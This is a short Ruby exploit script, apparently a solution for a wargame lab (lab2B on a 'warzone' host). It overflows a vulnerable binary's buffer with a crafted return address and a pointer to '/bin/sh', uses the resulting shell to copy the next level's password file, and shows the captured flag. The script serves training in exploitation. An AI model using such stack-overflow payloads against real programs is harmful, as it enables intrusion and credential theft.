payload  = 'A' * 27 + [0x080486bd].pack('<I')
payload += 'A' * 4 + [0x80487d0].pack('<I')    # Pointer to "/bin/sh" in the .rodata section (char *exec_string = "/bin/sh").

flag = '/tmp/lab2A.pass'

%x{echo 'cat /home/lab2A/.pass > #{flag}' | /levels/lab02/lab2B '#{payload}'}
puts `cat #{flag}`


# Output:
# -------------------------------------------
# lab2B@warzone:/levels/lab02$ ruby /tmp/exploit2B.rb
# i_c4ll_wh4t_i_w4nt_n00b
